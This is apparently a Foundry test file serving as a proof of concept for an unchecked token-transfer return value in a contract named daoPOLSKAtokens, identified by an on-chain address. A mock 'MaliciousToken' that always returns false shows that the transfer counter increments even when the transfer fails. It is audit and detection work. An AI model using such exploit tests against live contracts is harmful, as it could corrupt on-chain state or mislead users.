// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/0x19cf8481ea15427a98ba3cdd6d9e14690011ab10.sol";

contract MaliciousToken {
    // Always returns false to simulate failed transfers
    function transfer(address, uint256) external pure returns (bool) {
        return false;
    }
}

contract UncheckedTransferTest is Test {
    daoPOLSKAtokens dao;
    MaliciousToken maliciousToken;
    address owner;
    address receiver = address(0x456);

    function setUp() public {
        // Create owner address with ETH balance
        owner = makeAddr("owner");
        vm.deal(owner, 1 ether);
        
        // Deploy contracts
        vm.prank(owner);
        dao = new daoPOLSKAtokens();
        
        maliciousToken = new MaliciousToken();
    }

    function test_uncheckedTransferIncrementsCount() public {
        console2.log("--- BEFORE-Trigger numTransfers ---");
        uint256 initialCount = dao.numTransfers();
        console2.log("Initial transfer count: %d", initialCount);

        console2.log("--- Trigger sendTokenAw ---");
        vm.prank(owner);
        dao.sendTokenAw(address(maliciousToken), receiver, 100);
        console2.log("Called sendTokenAw with malicious token (which always fails transfer)");

        console2.log("--- AFTER-Trigger numTransfers ---");
        uint256 newCount = dao.numTransfers();
        console2.log("New transfer count: %d", newCount);

        // State change validation
        bool stateChanged = (newCount != initialCount);
        bool vulnerabilityExploited = (newCount == initialCount + 1);
        
        console2.log("State changed? %s", stateChanged ? "YES" : "NO");
        console2.log("Exploitation Status: %s", vulnerabilityExploited ? 
            "SUCCESS - Counter incremented despite failed transfer" :
            "FAILED - Counter not incremented");

        // Final vulnerability verdict
        if (vulnerabilityExploited) {
            console2.log("Vulnerability Exists: Transfer count incremented even though the token transfer failed");
        } else {
            console2.log("Vulnerability not Exist: Transfer count did not increment on failed token transfer");
        }

        assertEq(newCount, initialCount + 1, "Transfer count should increment despite failed transfer");
    }
}